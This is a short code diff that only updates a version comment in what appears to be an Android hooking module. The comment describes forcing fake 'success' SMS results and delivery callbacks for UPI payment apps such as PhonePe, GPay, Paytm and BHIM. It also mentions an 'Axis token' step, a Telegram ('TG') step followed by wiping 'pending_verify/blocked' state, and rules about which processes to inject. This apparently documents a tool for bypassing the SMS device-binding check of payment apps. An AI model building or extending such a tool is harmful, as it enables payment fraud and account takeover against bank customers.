@@ -23,11 +23,12 @@
 namespace {
 
 /**
- * v1.0.74 — Hero fake-success fast (Something went wrong / SMS expire)
+ * v1.0.75 — stop last_outgoing TG spam (same SMS thodi der baad)
  *
  * Messages + Hero + YesPay/FamPay/BHIM/…: Java ISms immediate.
  * PhonePe/GPay/Paytm only: Java ISms ~4s (open crash avoid).
  * PendingIntent RESULT_OK + delivery + SMS_SENT ASAP (Hero Axis token).
+ * After TG: wipe pending_verify/blocked everywhere + 24h dedupe.
  * NEVER Binder/phone/sender on UPI. NEVER inject com.android.phone.
  */
 
